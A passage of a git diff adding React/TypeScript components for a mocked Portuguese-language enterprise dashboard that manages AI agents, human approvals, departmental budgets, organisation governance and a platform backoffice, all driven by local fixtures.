+          </li>
+          <li>
+            <button
+              type="button"
+              className="nav-button"
+              aria-current={activeSection === "auth" ? "page" : undefined}
+              onClick={() => {
+                setActiveSection("auth");
+              }}
+            >
+              Login, MFA &amp; Multi-Org (WEB-001)
+            </button>
+          </li>
+          <li>
+            <button
+              type="button"
+              className="nav-button"
+              aria-current={activeSection === "platform" ? "page" : undefined}
+              onClick={() => {
+                setActiveSection("platform");
+              }}
+            >
+              Backoffice /platform (WEB-009)
+            </button>
+          </li>
+        </ul>
+      </nav>
+
+      <main id="main-content" className="shell-main">
+        <section className="org-hero" aria-labelledby="active-org-heading">
+          <div>
+            <div className="org-meta-row">
+              <span className="demo-badge demo-badge--info">
+                Tenant: {viewModel.organization.slug}
+              </span>
+              <span
+                className={
+                  viewModel.organization.isProvisioning
+                    ? "demo-badge demo-badge--warn"
+                    : "demo-badge demo-badge--ok"
+                }
+              >
+                Estado: {viewModel.organization.tenantState}
+              </span>
+              <span className="demo-badge demo-badge--info">
+                Papel simulado: {viewModel.organization.activeRole}
+              </span>
+            </div>
+            <h1 id="active-org-heading">
+              {viewModel.organization.displayName} — Painel Operacional
+            </h1>
+            <div className="org-meta-row">
+              <span>{viewModel.organization.legalName}</span>
+              <span>·</span>
+              <span>Plano: {viewModel.organization.planName}</span>
+              <span>·</span>
+              <span>Sessão mockada: {viewModel.organization.activeUserLabel}</span>
+            </div>
+          </div>
+
+          <div
+            style={{
+              fontSize: "0.8rem",
+              color: "var(--text-secondary)",
+              textAlign: "right",
+            }}
+          >
+            <div>Origem: Fixtures locais tipadas</div>
+            <div>{viewModel.organization.lastSyncLabel}</div>
+          </div>
+        </section>
+
+        {viewModel.organization.securityBanner && viewModel.variant === "ready" ? (
+          <section className="security-banner" aria-label="Alerta recente de segurança do tenant">
+            <strong>Segurança do Tenant:</strong> {viewModel.organization.securityBanner}
+          </section>
+        ) : null}
+
+        {viewModel.variant === "loading" ? (
+          <section
+            className="state-box"
+            role="status"
+            aria-live="polite"
+            aria-labelledby="loading-state-heading"
+          >
+            <h2 id="loading-state-heading">
+              Sincronizando departamentos e agentes (Simulação de carregamento)
+            </h2>
+            <p style={{ color: "var(--text-secondary)" }}>
+              Aguardando leitura agregada das fixtures de{" "}
+              <strong>{viewModel.organization.displayName}</strong>. Nenhum dado parcial ou de outra
+              organização é exibido durante a transição.
+            </p>
+            <button
+              type="button"
+              className="btn btn--secondary"
+              onClick={() => {
+                setVariant("ready");
+              }}
+            >
+              Concluir carregamento simulado
+            </button>
+          </section>
+        ) : null}
+
+        {viewModel.variant === "empty" ? (
+          <section className="state-box" aria-labelledby="empty-state-heading">
+            <h2 id="empty-state-heading">Nenhum departamento ativo para exibir</h2>
+            <p style={{ color: "var(--text-secondary)" }}>{viewModel.emptyStateMessage}</p>
+            <button
+              type="button"
+              className="btn btn--secondary"
+              onClick={() => {
+                setVariant("ready");
+              }}
+            >
+              Restaurar fixtures povoadas (Normal)
+            </button>
+          </section>
+        ) : null}
+
+        {viewModel.variant === "error" && viewModel.errorDetails ? (
+          <section
+            className="state-box state-box--error"
+            role="alert"
+            aria-labelledby="error-state-heading"
+          >
+            <div className="org-meta-row" style={{ marginBottom: "0.5rem" }}>
+              <span className="demo-badge demo-badge--danger">
+                HTTP {viewModel.errorDetails.httpStatus}
+              </span>
+              <code>{viewModel.errorDetails.code}</code>
+            </div>
+            <h2 id="error-state-heading">{viewModel.errorDetails.title}</h2>
+            <p style={{ color: "var(--text-primary)" }}>{viewModel.errorDetails.userMessage}</p>
+            <p
+              style={{
+                fontSize: "0.84rem",
+                color: "var(--text-secondary)",
+              }}
+            >
+              Código de correlação para suporte: <code>{viewModel.errorDetails.correlationId}</code>{" "}
+              (detalhes internos ocultados por segurança conforme diretriz de WEB-002).
+            </p>
+            <button
+              type="button"
+              className="btn btn--secondary"
+              onClick={() => {
+                setVariant("ready");
+              }}
+            >
+              Tentar novamente (Voltar ao estado Normal)
+            </button>
+          </section>
+        ) : null}
+
+        {viewModel.variant === "ready" ? (
+          <>
+            <section aria-labelledby="metrics-summary-heading">
+              <h2
+                id="metrics-summary-heading"
+                style={{ fontSize: "1.1rem", marginBottom: "0.75rem" }}
+              >
+                Indicadores Operacionais da Organização
+              </h2>
+              <div className="kpi-grid">
+                <div className="kpi-card">
+                  <span className="kpi-card__label">Departamentos Ativos</span>
+                  <span className="kpi-card__value">{viewModel.metrics.totalFloors}</span>
+                  <span className="kpi-card__detail">Módulos contratados na organização</span>
+                </div>
+
+                <div className="kpi-card">
+                  <span className="kpi-card__label">Agentes de IA</span>
+                  <span className="kpi-card__value">
+                    {viewModel.metrics.executingAgents} / {viewModel.metrics.totalAgents}
+                  </span>
+                  <span className="kpi-card__detail">
+                    Em execução agora ({viewModel.metrics.awaitingApprovalAgents} aguardando humano)
+                  </span>
+                </div>
+
+                <div className="kpi-card">
+                  <span className="kpi-card__label">Tarefas Ativas &amp; Fila</span>
+                  <span className="kpi-card__value">{viewModel.metrics.activeTasksCount}</span>
+                  <span className="kpi-card__detail">Jobs em andamento ou aguardando</span>
+                </div>
+
+                <div className="kpi-card">
+                  <span className="kpi-card__label">Aprovações Pendentes</span>
+                  <span className="kpi-card__value">{viewModel.metrics.pendingApprovalsCount}</span>
+                  <span className="kpi-card__detail">Requerem decisão humana (HITL)</span>
+                </div>
+
+                <div className="kpi-card">
+                  <span className="kpi-card__label">Orçamento Mensal de IA</span>
+                  <span className="kpi-card__value">
+                    {viewModel.metrics.totalBudget.percentage}%
+                  </span>
+                  <span className="kpi-card__detail">
+                    R$ {viewModel.metrics.totalBudget.spentBrl} / R${" "}
+                    {viewModel.metrics.totalBudget.limitBrl} (
+                    {viewModel.metrics.budgetAlertFloorsCount} depto(s) em alerta)
+                  </span>
+                </div>
+              </div>
+            </section>
+
+            {activeSection === "overview" || activeSection === "building" ? (
+              <BuildingFloorMap
+                floors={viewModel.floors}
+                selectedFloor={viewModel.selectedFloor}
+                filteredAgents={viewModel.filteredAgents}
+                isProvisioning={viewModel.organization.isProvisioning}
+                agentQuery={agentQuery}
+                onSelectFloor={(floorId) => {
+                  setSelectedFloorId(floorId);
+                }}
+                onChangeAgentQuery={(q) => {
+                  setAgentQuery(q);
+                }}
+              />
+            ) : null}
+
+            {activeSection === "overview" || activeSection === "operations" ? (
+              <OperationsPanels
+                approvals={viewModel.approvals}
+                tasks={viewModel.tasks}
+                floors={viewModel.floors}
+                recentActivity={viewModel.recentActivity}
+                canDecideApprovals={viewModel.organization.canDecideApprovals}
+                activeRoleLabel={viewModel.organization.activeRole}
+                decisions={decisions}
+                onDecideApproval={handleDecideApproval}
+              />
+            ) : null}
+
+            {activeSection === "overview" || activeSection === "chat" ? (
+              <AgentChatAndSecurityPanel />
+            ) : null}
+
+            {activeSection === "overview" || activeSection === "governance" ? (
+              <OrganizationGovernancePanel
+                orgSlug={viewModel.organization.slug}
+                activeRole={viewModel.organization.activeRole}
+                canMutateGovernance={viewModel.organization.canDecideApprovals}
+              />
+            ) : null}
+
+            {activeSection === "overview" || activeSection === "auth" ? (
+              <AuthAndMultiOrgPanel />
+            ) : null}
+
+            {activeSection === "overview" || activeSection === "platform" ? (
+              <PlatformBackofficePanel />
+            ) : null}
+          </>
+        ) : null}
+      </main>
+
+      <footer className="shell-footer">
+        <strong>NÚCLEOS Enterprise — Interface Web Mockada (LOC-WEB-001 / EP-10 sem 3D)</strong>
+        {" · "}Esta entrega utiliza exclusivamente fixtures TypeScript locais para validar
+        navegação, acessibilidade, fluxos de autenticação/multi-org, chat com sanitização XSS,
+        governança/CSV e backoffice. Os tickets canônicos do EP-10 permanecem abertos aguardando
+        integração com o backend; a cena 3D (<code>WEB-005..007</code>) fica para sessão futura.
+      </footer>
+    </div>
+  );
+}
diff --git a/apps/web/app/components/OperationsPanels.tsx b/apps/web/app/components/OperationsPanels.tsx
new file mode 100644
index 0000000..2b8fffa
--- /dev/null
+++ b/apps/web/app/components/OperationsPanels.tsx
@@ -0,0 +1,364 @@
+"use client";
+
+import type {
+  ApprovalRiskLevel,
+  FloorPresentation,
+  MockApprovalItem,
+  MockSecurityActivityItem,
+  MockTaskItem,
+  SecurityEventSeverity,
+  TaskStatus,
+} from "../../lib/mock-types.ts";
+
+export interface SimulatedApprovalDecision {
+  readonly approvalId: string;
+  readonly decision: "approved" | "rejected";
+}
+
+export interface OperationsPanelsProps {
+  readonly approvals: readonly MockApprovalItem[];
+  readonly tasks: readonly MockTaskItem[];
+  readonly floors: readonly FloorPresentation[];
+  readonly recentActivity: readonly MockSecurityActivityItem[];
+  readonly canDecideApprovals: boolean;
+  readonly activeRoleLabel: string;
+  readonly decisions: readonly SimulatedApprovalDecision[];
+  readonly onDecideApproval: (approvalId: string, decision: "approved" | "rejected") => void;
+}
+
+function getRiskBadge(risk: ApprovalRiskLevel): {
+  readonly label: string;
+  readonly className: string;
+} {
+  switch (risk) {
+    case "high":
+      return {
+        label: "Risco Alto",
+        className: "demo-badge demo-badge--danger",
+      };
+    case "medium":
+      return {
+        label: "Risco Médio",
+        className: "demo-badge demo-badge--warn",
+      };
+    case "low":
+      return { label: "Risco Baixo", className: "demo-badge demo-badge--ok" };
+  }
+}
+
+function getTaskBadge(status: TaskStatus): {
+  readonly label: string;
+  readonly className: string;
+} {
+  switch (status) {
+    case "running":
+      return { label: "Em execução", className: "demo-badge demo-badge--ok" };
+    case "awaiting_human":
+      return {
+        label: "Aguarda humano",
+        className: "demo-badge demo-badge--warn",
+      };
+    case "queued":
+      return { label: "Na fila", className: "demo-badge demo-badge--info" };
+    case "completed":
+      return { label: "Concluída", className: "demo-badge demo-badge--ok" };
+    case "failed":
+      return { label: "Falhou", className: "demo-badge demo-badge--danger" };
+  }
+}
+
+function getSeverityBadge(severity: SecurityEventSeverity): {
+  readonly label: string;
+  readonly className: string;
+} {
+  switch (severity) {
+    case "high":
+      return { label: "Crítico", className: "demo-badge demo-badge--danger" };
+    case "warning":
+      return { label: "Alerta", className: "demo-badge demo-badge--warn" };
+    case "info":
+      return { label: "Info", className: "demo-badge demo-badge--info" };
+  }
+}
+
+export function OperationsPanels({
+  approvals,
+  tasks,
+  floors,
+  recentActivity,
+  canDecideApprovals,
+  activeRoleLabel,
+  decisions,
+  onDecideApproval,
+}: OperationsPanelsProps) {
+  return (
+    <div className="two-col-grid">
+      <section className="panel-card" aria-labelledby="approvals-panel-heading">
+        <div className="panel-header">
+          <div>
+            <h2 id="approvals-panel-heading">Aprovações Humanas Pendentes (HITL)</h2>
+            <p
+              style={{
+                margin: "0.2rem 0 0",
+                fontSize: "0.84rem",
+                color: "var(--text-secondary)",
+              }}
+            >
+              Resumo validado e hash da ação antes de liberar execução.
+            </p>
+          </div>
+          <span className="demo-badge demo-badge--warn">{approvals.length} pendente(s)</span>
+        </div>
+
+        <ul className="item-list">
+          {approvals.map((item) => {
+            const riskMeta = getRiskBadge(item.riskLevel);
+            const simulated = decisions.find((entry) => entry.approvalId === item.id);
+
+            return (
+              <li key={item.id} className="item-card">
+                <div
+                  style={{
+                    display: "flex",
+                    justifyContent: "space-between",
+                    alignItems: "flex-start",
+                    gap: "0.5rem",
+                  }}
+                >
+                  <strong>{item.title}</strong>
+                  <span className={riskMeta.className}>{riskMeta.label}</span>
+                </div>
+
+                <div
+                  style={{
+                    fontSize: "0.8rem",
+                    color: "var(--text-secondary)",
+                  }}
+                >
+                  {item.departmentName} · Agente: <strong>{item.agentName}</strong> ·{" "}
+                  {item.expiresInLabel}
+                </div>
+
+                <p style={{ margin: "0.2rem 0", fontSize: "0.86rem" }}>{item.serverSummary}</p>
+
+                <div className="code-preview">
+                  <div>
+                    Hash da ação: <strong>{item.actionHash}</strong>
+                  </div>
+                  <div>Argumentos: {item.argumentsPreview}</div>
+                </div>
+
+                {simulated ? (
+                  <div
+                    role="status"
+                    className={
+                      simulated.decision === "approved"
+                        ? "demo-badge demo-badge--ok"
+                        : "demo-badge demo-badge--danger"
+                    }
+                  >
+                    Decisão simulada localmente:{" "}
+                    {simulated.decision === "approved"
+                      ? "APROVADA (sem efeito de rede)"
+                      : "REJEITADA (sem efeito de rede)"}
+                  </div>
+                ) : canDecideApprovals ? (
+                  <div className="action-row">
+                    <button
+                      type="button"
+                      className="btn btn--approve"
+                      aria-label={`Simular aprovação para ${item.title}`}
+                      onClick={() => {
+                        onDecideApproval(item.id, "approved");
+                      }}
+                    >
+                      Simular Aprovação
+                    </button>
+                    <button
+                      type="button"
+                      className="btn btn--reject"
+                      aria-label={`Simular rejeição para ${item.title}`}
+                      onClick={() => {
+                        onDecideApproval(item.id, "rejected");
+                      }}
+                    >
+                      Simular Rejeição
+                    </button>
+                  </div>
+                ) : (
+                  <div className="demo-badge demo-badge--info" style={{ alignSelf: "flex-start" }}>
+                    Somente leitura: papel atual ({activeRoleLabel}) não possui{" "}
+                    {item.requiredPermission}
+                  </div>
+                )}
+              </li>
+            );
+          })}
+        </ul>
+      </section>
+
+      <section className="panel-card" aria-labelledby="tasks-panel-heading">
+        <div className="panel-header">
+          <div>
+            <h2 id="tasks-panel-heading">Tarefas &amp; Fila de Execução</h2>
+            <p
+              style={{
+                margin: "0.2rem 0 0",
+                fontSize: "0.84rem",
+                color: "var(--text-secondary)",
+              }}
+            >
+              Jobs acompanhados pelo Dispatcher e estado atual por agente.
+            </p>
+          </div>
+          <span className="demo-badge demo-badge--info">{tasks.length} registrada(s)</span>
+        </div>
+
+        <ul className="item-list">
+          {tasks.map((task) => {
+            const statusMeta = getTaskBadge(task.status);
+            return (
+              <li key={task.id} className="item-card">
+                <div
+                  style={{
+                    display: "flex",
+                    justifyContent: "space-between",
+                    alignItems: "flex-start",
+                    gap: "0.5rem",
+                  }}
+                >
+                  <div>
+                    <code>{task.code}</code> · <strong>{task.title}</strong>
+                  </div>
+                  <span className={statusMeta.className}>{statusMeta.label}</span>
+                </div>
+                <div
+                  style={{
+                    fontSize: "0.8rem",
+                    color: "var(--text-secondary)",
+                  }}
+                >
+                  {task.departmentName} · {task.agentName} · Iniciado {task.startedAtLabel} (
+                  {task.durationLabel})
+                </div>
+              </li>
+            );
+          })}
+        </ul>
+      </section>
+
+      <section className="panel-card" aria-labelledby="budget-panel-heading">
+        <div className="panel-header">
+          <div>
+            <h2 id="budget-panel-heading">Consumo de IA vs. Orçamento por Departamento</h2>
+            <p
+              style={{
+                margin: "0.2rem 0 0",
+                fontSize: "0.84rem",
+                color: "var(--text-secondary)",
+              }}
+            >
+              Limiares automáticos de alerta em 80% e contenção em 100%.
+            </p>
+          </div>
+        </div>
+
+        <ul className="item-list">
+          {floors.map((floor) => (
+            <li key={floor.id} className="item-card">
+              <div
+                style={{
+                  display: "flex",
+                  justifyContent: "space-between",
+                  alignItems: "center",
+                  gap: "0.5rem",
+                }}
+              >
+                <strong>
+                  {floor.floorNumber}º Andar · {floor.name}
+                </strong>
+                <span
+                  className={
+                    floor.budgetStatus.alertLevel === "critical_100"
+                      ? "demo-badge demo-badge--danger"
+                      : floor.budgetStatus.alertLevel === "warning_80"
+                        ? "demo-badge demo-badge--warn"
+                        : "demo-badge demo-badge--ok"
+                  }
+                >
+                  {floor.budgetStatus.percentage}% — {floor.budgetStatus.alertLabel}
+                </span>
+              </div>
+              <div
+                style={{
+                  fontSize: "0.82rem",
+                  color: "var(--text-secondary)",
+                }}
+              >
+                Gasto: R$ {floor.monthlySpentBrl} de R$ {floor.monthlyBudgetBrl} · Tokens:{" "}
+                {floor.tokensUsedMonth.toLocaleString("pt-BR")} /{" "}
+                {floor.tokensLimitMonth.toLocaleString("pt-BR")}
+              </div>
+            </li>
+          ))}
+        </ul>
+      </section>
+
+      <section className="panel-card" aria-labelledby="activity-panel-heading">
+        <div className="panel-header">
+          <div>
+            <h2 id="activity-panel-heading">Atividade Recente &amp; Eventos de Segurança</h2>
+            <p
+              style={{
+                margin: "0.2rem 0 0",
+                fontSize: "0.84rem",
+                color: "var(--text-secondary)",
+              }}
+            >
+              Trilha de auditoria isolada do tenant com código de correlação.
+            </p>
+          </div>
+        </div>
+
+        <ul className="item-list">
+          {recentActivity.map((event) => {
+            const sev = getSeverityBadge(event.severity);
+            return (
+              <li key={event.id} className="item-card">
+                <div
+                  style={{
+                    display: "flex",
+                    justifyContent: "space-between",
+                    alignItems: "center",
+                    gap: "0.5rem",
+                  }}
+                >
+                  <code>{event.eventCode}</code>
+                  <span className={sev.className}>{sev.label}</span>
+                </div>
+                <p style={{ margin: "0.2rem 0", fontSize: "0.85rem" }}>{event.summary}</p>
+                <div
+                  style={{
+                    fontSize: "0.78rem",
+                    color: "var(--text-muted)",
+                    display: "flex",
+                    justifyContent: "space-between",
+                    flexWrap: "wrap",
+                    gap: "0.5rem",
+                  }}
+                >
+                  <span>
+                    Origem: {event.actorLabel} ({event.timestampLabel})
+                  </span>
+                  <span>
+                    Correlação: <code>{event.correlationId}</code>
+                  </span>
+                </div>
+              </li>
+            );
+          })}
+        </ul>
+      </section>
+    </div>
+  );
+}
diff --git a/apps/web/app/components/OrganizationGovernancePanel.tsx b/apps/web/app/components/OrganizationGovernancePanel.tsx
new file mode 100644
index 0000000..aa32427
--- /dev/null
+++ b/apps/web/app/components/OrganizationGovernancePanel.tsx
@@ -0,0 +1,264 @@
+"use client";
+
+import { useState } from "react";
+import {
+  generateOrganizationUsageCsv,
+  MOCK_ENTITLEMENTS,
+  MOCK_INTEGRATIONS,
+  MOCK_ORG_MEMBERS,
+  MOCK_RAG_DOCUMENTS,
+} from "../../lib/mock-enterprise-data.ts";
+import type { UserRole } from "../../lib/mock-types.ts";
+
+export interface OrganizationGovernancePanelProps {
+  readonly orgSlug: string;
+  readonly activeRole: UserRole;
+  readonly canMutateGovernance: boolean;
+}
+
+export function OrganizationGovernancePanel({
+  orgSlug,
+  activeRole,
+  canMutateGovernance,
+}: OrganizationGovernancePanelProps) {
+  const [showCsvPreview, setShowCsvPreview] = useState<boolean>(false);
+  const [invitedEmailNotice, setInvitedEmailNotice] = useState<string | null>(null);
+
+  const csvContent = generateOrganizationUsageCsv(orgSlug);
+
+  return (
+    <section className="panel-card" aria-labelledby="org-governance-heading">
+      <div className="panel-header">
+        <div>
+          <h2 id="org-governance-heading">
+            Gestão da Organização: Membros, Módulos, Integrações, Documentos RAG &amp; Exportação
+            CSV (WEB-003)
+          </h2>
+          <p
+            style={{
+              margin: "0.25rem 0 0",
+              fontSize: "0.86rem",
+              color: "var(--text-secondary)",
+            }}
+          >
+            Ações de mutação respeitam o papel ativo ({activeRole}). Quando o papel é{" "}
+            <code>viewer</code>, convites e alterações ficam ocultos.
+          </p>
+        </div>
+
+        <button
+          type="button"
+          className="btn btn--secondary"
+          onClick={() => {
+            setShowCsvPreview((prev) => !prev);
+          }}
+        >
+          {showCsvPreview
+            ? "Ocultar CSV de Uso (AIG-003)"
+            : "Exportar / Visualizar CSV de Uso de IA"}
+        </button>
+      </div>
+
+      {showCsvPreview ? (
+        <div style={{ marginBottom: "1.25rem" }}>
+          <strong style={{ fontSize: "0.84rem" }}>
+            Relatório CSV de Consumo de IA ({orgSlug}.csv — protegido contra CSV Injection):
+          </strong>
+          <pre className="code-preview" style={{ marginTop: "0.4rem" }}>
+            {csvContent}
+          </pre>
+        </div>
+      ) : null}
+
+      <div className="two-col-grid">
+        <div className="item-card">
+          <div className="panel-header" style={{ marginBottom: "0.5rem" }}>
+            <h3>Membros &amp; Papéis ({MOCK_ORG_MEMBERS.length})</h3>
+            {canMutateGovernance ? (
+              <button
+                type="button"
+                className="btn btn--approve"
+                onClick={() => {
+                  setInvitedEmailNotice(
+                    "Convite simulado registrado para novo.operador@aurora-demo.example (sem envio de rede).",
+                  );
+                }}
+              >
+                Simular Convite de Membro
+              </button>
+            ) : (
+              <span className="demo-badge demo-badge--info">
+                Papel {activeRole}: mutação oculta (WEB-003 AC-1)
+              </span>
+            )}
+          </div>
+
+          {invitedEmailNotice ? (
+            <p
+              role="status"
+              style={{
+                fontSize: "0.8rem",
+                color: "var(--status-ok-text)",
+                margin: "0 0 0.5rem",
+              }}
+            >
+              {invitedEmailNotice}
+            </p>
+          ) : null}
+
+          <ul className="item-list">
+            {MOCK_ORG_MEMBERS.map((member) => (
+              <li
+                key={member.id}
+                style={{
+                  display: "flex",
+                  justifyContent: "space-between",
+                  alignItems: "center",
+                  fontSize: "0.84rem",
+                  paddingBottom: "0.4rem",
+                  borderBottom: "1px solid var(--border-subtle)",
+                }}
+              >
+                <div>
+                  <strong>{member.name}</strong> ({member.email})
+                  <div
+                    style={{
+                      fontSize: "0.76rem",
+                      color: "var(--text-secondary)",
+                    }}
+                  >
+                    MFA: {member.mfaEnabled ? "Ativo" : "Pendente"} · {member.lastSeenLabel}
+                  </div>
+                </div>
+                <span className="demo-badge demo-badge--info">{member.role}</span>
+              </li>
+            ))}
+          </ul>
+        </div>
+
+        <div className="item-card">
+          <h3>Módulos Contratados / Entitlements (Somente Leitura)</h3>
+          <ul className="item-list">
+            {MOCK_ENTITLEMENTS.map((mod) => (
+              <li
+                key={mod.moduleCode}
+                style={{
+                  display: "flex",
+                  justifyContent: "space-between",
+                  alignItems: "center",
+                  fontSize: "0.84rem",
+                  paddingBottom: "0.4rem",
+                  borderBottom: "1px solid var(--border-subtle)",
+                }}
+              >
+                <div>
+                  <code>{mod.moduleCode}</code> · <strong>{mod.name}</strong>
+                  <div
+                    style={{
+                      fontSize: "0.76rem",
+                      color: "var(--text-secondary)",
+                    }}
+                  >
+                    Agentes: {mod.activeAgents}/{mod.maxAgents} · Cota:{" "}
+                    {mod.monthlyQuotaTokens.toLocaleString("pt-BR")} tokens
+                  </div>
+                </div>
+                <span className="demo-badge demo-badge--ok">{mod.status}</span>
+              </li>
+            ))}
+          </ul>
+        </div>
+
+        <div className="item-card">
+          <h3>Integrações &amp; Conectores (Metadados sem Segredos)</h3>
+          <ul className="item-list">
+            {MOCK_INTEGRATIONS.map((conn) => (
+              <li
+                key={conn.id}
+                style={{
+                  fontSize: "0.84rem",
+                  paddingBottom: "0.4rem",
+                  borderBottom: "1px solid var(--border-subtle)",
+                }}
+              >
+                <div
+                  style={{
+                    display: "flex",
+                    justifyContent: "space-between",
+                    alignItems: "center",
+                  }}
+                >
+                  <strong>{conn.name}</strong>
+                  <span
+                    className={
+                      conn.status === "HEALTHY"
+                        ? "demo-badge demo-badge--ok"
+                        : "demo-badge demo-badge--danger"
+                    }
+                  >
+                    {conn.status}
+                  </span>
+                </div>
+                <div
+                  style={{
+                    fontSize: "0.76rem",
+                    color: "var(--text-secondary)",
+                  }}
+                >
+                  Egress allowlist: <code>{conn.egressDomain}</code> · Cofre:{" "}
+                  <code>{conn.credentialVaultRef}</code>
+                </div>
+              </li>
+            ))}
+          </ul>
+        </div>
+
+        <div className="item-card">
+          <h3>Documentos &amp; Indexação RAG do Tenant</h3>
+          <ul className="item-list">
+            {MOCK_RAG_DOCUMENTS.map((doc) => (
+              <li
+                key={doc.id}
+                style={{
+                  fontSize: "0.84rem",
+                  paddingBottom: "0.4rem",
+                  borderBottom: "1px solid var(--border-subtle)",
+                }}
+              >
+                <div
+                  style={{
+                    display: "flex",
+                    justifyContent: "space-between",
+                    alignItems: "center",
+                    gap: "0.5rem",
+                  }}
+                >
+                  <strong>{doc.title}</strong>
+                  <span
+                    className={
+                      doc.status === "INDEXED"
+                        ? "demo-badge demo-badge--ok"
+                        : doc.status === "INDEXING"
+                          ? "demo-badge demo-badge--warn"
+                          : "demo-badge demo-badge--danger"
+                    }
+                  >
+                    {doc.status}
+                  </span>
+                </div>
+                <div
+                  style={{
+                    fontSize: "0.76rem",
+                    color: "var(--text-secondary)",
+                  }}
+                >
+                  {doc.departmentName} · {doc.chunksCount} chunks · {doc.updatedAtLabel}
+                </div>
+              </li>
+            ))}
+          </ul>
+        </div>
+      </div>
+    </section>
+  );
+}
diff --git a/apps/web/app/components/PlatformBackofficePanel.tsx b/apps/web/app/components/PlatformBackofficePanel.tsx
new file mode 100644
index 0000000..4b054ca
--- /dev/null
+++ b/apps/web/app/components/PlatformBackofficePanel.tsx
@@ -0,0 +1,294 @@
+"use client";
+
+import { useState } from "react";
+import { MOCK_SESSION_ACTORS, resolvePlatformBackoffice } from "../../lib/mock-enterprise-data.ts";
+
+export function PlatformBackofficePanel() {
+  const [actorId, setActorId] = useState<string>("usr-roberto-admin-03");
+  const [killSwitchedTenants, setKillSwitchedTenants] = useState<readonly string[]>([
+    "vanguarda-agro",
+  ]);
+  const [dlqJustification, setDlqJustification] = useState<string>(
+    "Reprocessar após normalização de latência do gateway upstream.",
+  );
+  const [requeuedJobs, setRequeuedJobs] = useState<readonly string[]>([]);
+  const [auditFeedback, setAuditFeedback] = useState<string | null>(null);
+
+  const actor =
+    MOCK_SESSION_ACTORS.find((item) => item.id === actorId) ?? MOCK_SESSION_ACTORS[0] ?? null;
+
+  const backoffice = resolvePlatformBackoffice(actor);
+
+  function handleToggleKillSwitch(slug: string): void {
+    const isCurrentlyActive = killSwitchedTenants.includes(slug);
+    const next = isCurrentlyActive
+      ? killSwitchedTenants.filter((item) => item !== slug)
+      : [...killSwitchedTenants, slug];
+
+    setKillSwitchedTenants(next);
+    setAuditFeedback(
+      `Auditoria /platform: Kill switch de orçamento para "${slug}" alterado para ${!isCurrentlyActive ? "ATIVADO" : "DESATIVADO"} por ${actor?.email ?? "operador"}.`,
+    );
+  }
+
+  function handleRequeueDlq(jobId: string): void {
+    if (dlqJustification.trim().length < 10) {
+      setAuditFeedback(
+        "Erro de validação: Requeue de DLQ exige justificativa auditável com pelo menos 10 caracteres.",
+      );
+      return;
+    }
+    setRequeuedJobs((prev) => (prev.includes(jobId) ? prev : [...prev, jobId]));
+    setAuditFeedback(
+      `Auditoria /platform: Job ${jobId} reenfileirado com justificativa: "${dlqJustification.trim()}".`,
+    );
+  }
+
+  return (
+    <section className="panel-card" aria-labelledby="platform-backoffice-heading">
+      <div className="panel-header">
+        <div>
+          <h2 id="platform-backoffice-heading">
+            Backoffice de Plataforma — <code>/platform</code> (WEB-009)
+          </h2>
+          <p
+            style={{
+              margin: "0.25rem 0 0",
+              fontSize: "0.86rem",
+              color: "var(--text-secondary)",
+            }}
+          >
+            Exclusivo para <code>platform_admin</code> com MFA. Exibe apenas metadados operacionais,
+            provisionamento, DLQ, capacidade e break-glass — <strong>jamais</strong> conteúdo
+            privado de conversas ou documentos do tenant.
+          </p>
+        </div>
+
+        <div className="control-group">
+          <label htmlFor="backoffice-actor-select">Testar acesso a /platform com papel</label>
+          <select
+            id="backoffice-actor-select"
+            className="control-select"
+            value={actorId}
+            onChange={(e) => {
+              setActorId(e.target.value);
+              setAuditFeedback(null);
+            }}
+          >
+            {MOCK_SESSION_ACTORS.map((item) => (
+              <option key={item.id} value={item.id}>
+                {item.displayName} ({item.platformRole})
+              </option>
+            ))}
+          </select>
+        </div>
+      </div>
+
+      {!backoffice.allowed ? (
+        <div role="alert" className="state-box state-box--error" style={{ marginTop: "0.5rem" }}>
+          <span className="demo-badge demo-badge--danger">
+            HTTP {backoffice.httpStatus} FORBIDDEN
+          </span>
+          <h3 style={{ marginTop: "0.5rem" }}>Acesso bloqueado à área /platform (WEB-009 AC-1)</h3>
+          <p>{backoffice.denialReason}</p>
+        </div>
+      ) : (
+        <>
+          <div className="kpi-grid" style={{ marginBottom: "1.25rem" }}>
+            <div className="kpi-card">
+              <span className="kpi-card__label">Host VPS do MVP</span>
+              <span className="kpi-card__value">
+                {backoffice.hostCapacity.activeTenantsCount} /{" "}
+                {backoffice.hostCapacity.maxTenantsMvp} tenants
+              </span>
+              <span className="kpi-card__detail">{backoffice.hostCapacity.vpsNodeLabel}</span>
+            </div>
+            <div className="kpi-card">
+              <span className="kpi-card__label">Memória RAM do Host</span>
+              <span className="kpi-card__value">
+                {backoffice.hostCapacity.ramUsedGb} GB / {backoffice.hostCapacity.ramTotalGb} GB
+              </span>
+              <span className="kpi-card__detail">
+                CPU: {backoffice.hostCapacity.cpuUsagePct}% · Disco NVMe:{" "}
+                {backoffice.hostCapacity.diskUsedPct}%
+              </span>
+            </div>
+          </div>
+
+          <div className="two-col-grid">
+            <div className="item-card">
+              <h3>Tenants, Custos, Deriva &amp; Kill Switch de Orçamento</h3>
+              <ul className="item-list">
+                {backoffice.tenants.map((tnt) => {
+                  const killActive = killSwitchedTenants.includes(tnt.slug);
+                  return (
+                    <li
+                      key={tnt.tenantId}
+                      style={{
+                        paddingBottom: "0.6rem",
+                        borderBottom: "1px solid var(--border-subtle)",
+                        fontSize: "0.84rem",
+                      }}
+                    >
+                      <div
+                        style={{
+                          display: "flex",
+                          justifyContent: "space-between",
+                          alignItems: "center",
+                          gap: "0.5rem",
+                        }}
+                      >
+                        <div>
+                          <strong>{tnt.slug}</strong> ({tnt.state}) · {tnt.activeContainers}{" "}
+                          containers
+                        </div>
+                        <span
+                          className={
+                            tnt.reconcilerDrift === "NONE"
+                              ? "demo-badge demo-badge--ok"
+                              : "demo-badge demo-badge--warn"
+                          }
+                        >
+                          Drift: {tnt.reconcilerDrift}
+                        </span>
+                      </div>
+                      <div
+                        style={{
+                          display: "flex",
+                          justifyContent: "space-between",
+                          alignItems: "center",
+                          marginTop: "0.35rem",
+                          gap: "0.5rem",
+                        }}
+                      >
+                        <span>
+                          Custo IA: R$ {tnt.monthlyCostBrl} / R$ {tnt.monthlyCapBrl}
+                        </span>
+                        <button
+                          type="button"
+                          className={killActive ? "btn btn--approve" : "btn btn--reject"}
+                          onClick={() => {
+                            handleToggleKillSwitch(tnt.slug);
+                          }}
+                        >
+                          {killActive
+                            ? "Reativar Orçamento (Kill Switch ON)"
+                            : "Acionar Kill Switch de Orçamento"}
+                        </button>
+                      </div>
+                    </li>
+                  );
+                })}
+              </ul>
+            </div>
+
